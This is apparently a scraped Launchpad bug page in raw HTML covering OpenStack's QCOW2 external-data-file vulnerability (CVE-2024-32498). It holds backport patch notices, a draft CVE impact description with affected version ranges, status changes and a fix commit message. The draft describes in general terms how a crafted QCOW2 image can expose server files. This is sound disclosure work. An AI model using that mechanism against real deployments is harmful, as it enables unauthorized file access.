      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T16:08:47.520143+00:00" title="2024-04-03 16:08:47 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Cinder patch for 2023.1 (Antelope)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Cinder patch for 2023.1 (Antelope)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/36" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T16:09:40.639126+00:00" title="2024-04-03 16:09:40 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/36"> #36</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Cinder patch for Zed.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Cinder patch for Zed.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/37" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T16:10:41.396541+00:00" title="2024-04-03 16:10:41 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/37"> #37</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Cinder patch for unmaintained/yoga, as a courtesy.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Cinder patch for unmaintained/yoga, as a courtesy.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/38" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-05T12:17:24.973993+00:00" title="2024-04-05 12:17:24 UTC">on 2024-04-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/38"> #38</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@arnaud-morin: would you mind deleting your patches so that people don&#x27;t get confused?  Thanks!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@arnaud-morin: would you mind deleting your patches so that people don't get confused?  Thanks!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/39" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-05T16:56:11.270776+00:00" title="2024-04-05 16:56:11 UTC">on 2024-04-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/39"> #39</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Martin Kaesberger: If there&#x27;s any organization you&#x27;re affiliated with and you&#x27;d like it credited along with your name, please let me know.</p>
<p>Here&#x27;s a draft impact description, a quick review for any inaccuracies is appreciated so I can request a CVE assignment with it...</p>
<p>title: Arbitrary file access through custom QCOW2 external data</p>
<p>description: &gt;<br />
&nbsp;&nbsp;Martin Kaesberger reported a vulnerability in QCOW2 image processing for<br />
&nbsp;&nbsp;Cinder, Glance and Nova. By supplying a specially created QCOW2 image which<br />
&nbsp;&nbsp;references a specific data file path, an authenticated user may convince<br />
&nbsp;&nbsp;systems to return a copy of that file&#x27;s contents from the server resulting in<br />
&nbsp;&nbsp;unauthorized access to potentially sensitive data. All Cinder deployments are<br />
&nbsp;&nbsp;affected; only Glance deployments with image conversion enabled are affected;<br />
&nbsp;&nbsp;all Nova deployments are affected.</p>
<p>affected-products:<br />
&nbsp;&nbsp;- product: Cinder<br />
&nbsp;&nbsp;&nbsp;&nbsp;version: &#x27;&lt;21.3.3, &gt;=22.0.0 &lt;22.1.2, &gt;=23.0.0 &lt;23.1.1, ==24.0.0&#x27;<br />
&nbsp;&nbsp;- product: Glance<br />
&nbsp;&nbsp;&nbsp;&nbsp;version: &#x27;&lt;25.1.1, ==26.0.0, ==27.0.0, &gt;=28.0.0 &lt;28.0.2&#x27;<br />
&nbsp;&nbsp;- product: Nova<br />
&nbsp;&nbsp;&nbsp;&nbsp;version: &#x27;&lt;26.2.3, &gt;=27.0.0 &lt;27.2.1, &gt;=28.0.0 &lt;28.0.2, &gt;=29.0.0 &lt;29.0.2&#x27;</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Martin Kaesberger: If there's any organization you're affiliated with and you'd like it credited along with your name, please let me know.

Here's a draft impact description, a quick review for any inaccuracies is appreciated so I can request a CVE assignment with it...

title: Arbitrary file access through custom QCOW2 external data

description: &gt;
  Martin Kaesberger reported a vulnerability in QCOW2 image processing for
  Cinder, Glance and Nova. By supplying a specially created QCOW2 image which
  references a specific data file path, an authenticated user may convince
  systems to return a copy of that file's contents from the server resulting in
  unauthorized access to potentially sensitive data. All Cinder deployments are
  affected; only Glance deployments with image conversion enabled are affected;
  all Nova deployments are affected.

affected-products:
  - product: Cinder
    version: '&lt;21.3.3, &gt;=22.0.0 &lt;22.1.2, &gt;=23.0.0 &lt;23.1.1, ==24.0.0'
  - product: Glance
    version: '&lt;25.1.1, ==26.0.0, ==27.0.0, &gt;=28.0.0 &lt;28.0.2'
  - product: Nova
    version: '&lt;26.2.3, &gt;=27.0.0 &lt;27.2.1, &gt;=28.0.0 &lt;28.0.2, &gt;=29.0.0 &lt;29.0.2'
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-04-05 18:40:46 UTC" datetime="2024-04-05T18:40:46.067072+00:00">on 2024-04-05</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Incomplete &#8594; Confirmed
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; High
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Jeremy Stanley (fungi)
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Triaged
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/40" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-05T19:02:25.257516+00:00" title="2024-04-05 19:02:25 UTC">on 2024-04-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/40"> #40</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Draft description LGTM, and the version lists check out.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Draft description LGTM, and the version lists check out.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-04-05 19:39:58 UTC" datetime="2024-04-05T19:39:58.462943+00:00">on 2024-04-05</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Triaged &#8594; In Progress
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-06-18 16:32:29 UTC" datetime="2024-06-18T16:32:29.661198+00:00">on 2024-06-18</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - Arbitrary file access through QCOW2 external data file<br />+ Arbitrary file access through QCOW2 external data file (CVE-2024-32498)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-06-25 20:01:59 UTC" datetime="2024-06-25T20:01:59.860525+00:00">on 2024-06-25</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~sylvain-bauza" class="sprite person">Sylvain Bauza (sylvain-bauza)</a>
    
    <time title="2024-06-26 09:02:10 UTC" datetime="2024-06-26T09:02:10.931330+00:00">on 2024-06-26</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Sylvain Bauza (sylvain-bauza)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-07-02 13:32:58 UTC" datetime="2024-07-02T13:32:58.379601+00:00">on 2024-07-02</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - Arbitrary file access through QCOW2 external data file (CVE-2024-32498)<br />+ [OSSA-2024-001] Arbitrary file access through QCOW2 external data file<br />+ (CVE-2024-32498)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-07-02 14:06:19 UTC" datetime="2024-07-02T14:06:19.948046+00:00">on 2024-07-02</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
    
    <time title="2024-07-02 16:05:19 UTC" datetime="2024-07-02T16:05:19.978454+00:00">on 2024-07-02</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
    
    <time title="2024-07-03 16:24:40 UTC" datetime="2024-07-03T16:24:40.709143+00:00">on 2024-07-03</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
    
    <time title="2024-07-03 20:08:06 UTC" datetime="2024-07-03T20:08:06.286863+00:00">on 2024-07-03</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in cinder: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
    
    <time title="2024-07-04 09:21:21 UTC" datetime="2024-07-04T09:21:21.818334+00:00">on 2024-07-04</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in glance: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
    
    <time title="2024-07-06 22:41:35 UTC" datetime="2024-07-06T22:41:35.934139+00:00">on 2024-07-06</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-unmaintained-zed
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          

          
              <div>
  <div id="comments-container"></div>
  <div class="boardComment comments-hidden-message" style="border-bottom: 0">
    <div class="boardCommentDetails">
      <table>
        <tbody>
          <tr>
            <td>
              <span class="sprite arrowRight"></span>
              375 comments hidden
              <span id="more-comments-spinner" class="hidden">
                Loading more comments
                <img src="/@@/spinner" />
              </span>
            </td>

            <td class="bug-comment-index">
              <a href="?comments=all" id="show-comments-link" class="show-comments-link sprite retry" style="white-space: nowrap">
                 view all 455 comments</a>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</div>
          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/416" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-29T13:58:55.316825+00:00" title="2024-07-29 13:58:55 UTC">on 2024-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/416">
                <strong>Fix proposed to cinder (unmaintained/xena)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/416"> #416</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/xena<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/cinder/+/925097">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/cinder/<wbr />+/925097</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/xena
Review: https://review.opendev.org/c/openstack/cinder/+/925097</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/417" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-29T14:03:44.812880+00:00" title="2024-07-29 14:03:44 UTC">on 2024-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/417">
                <strong>Fix proposed to cinder (unmaintained/wallaby)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/417"> #417</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/<wbr />wallaby<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/cinder/+/925098">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/cinder/<wbr />+/925098</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/wallaby
Review: https://review.opendev.org/c/openstack/cinder/+/925098</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/418" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-30T17:37:04.280171+00:00" title="2024-07-30 17:37:04 UTC">on 2024-07-30</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/418">
                <strong>Related fix merged to nova (unmaintained/zed)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/418"> #418</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924241">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924241</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/e8f00617ed319aa37f6946cf10883eef6d180612">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />e8f00617ed319aa<wbr />37f6946cf10883e<wbr />ef6d180612</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/zed</p>
<p>commit e8f00617ed319aa<wbr />37f6946cf10883e<wbr />ef6d180612<br />
Author: Sean Mooney &lt;email address hidden&gt;<br />
Date:   Thu Jul 4 20:09:31 2024 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add iso file format inspector</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change includes unit tests for the ISO<br />
&nbsp;&nbsp;&nbsp;&nbsp;format inspector using mkisofs to generate<br />
&nbsp;&nbsp;&nbsp;&nbsp;the iso files.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;A test for stashing qcow content in the system_area<br />
&nbsp;&nbsp;&nbsp;&nbsp;of an iso file is also included.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change modifies format_<wbr />inspector.<wbr />detect_<wbr />file_format<br />
&nbsp;&nbsp;&nbsp;&nbsp;to evaluate all inspectors until they are complete and<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise an InvalidDiskInfo exception if multiple formats<br />
&nbsp;&nbsp;&nbsp;&nbsp;match.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I7e12718fb3e1f7<wbr />7eb8d1cfcb9fa64<wbr />e8ddeb9e712<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit b1cc39848ebe9b9<wbr />cb63141a647bda5<wbr />2a2842ee4b)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit eeda7c333c77321<wbr />6c2161599266738<wbr />74ce4843ba)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 24628ecbbe9d5fd<wbr />d4fe6767ca92395<wbr />f0d3da9e48)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 65f0789df05e2ba<wbr />7f11c0eaf2c6959<wbr />367acbced2)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/924241
Committed: https://opendev.org/openstack/nova/commit/e8f00617ed319aa37f6946cf10883eef6d180612
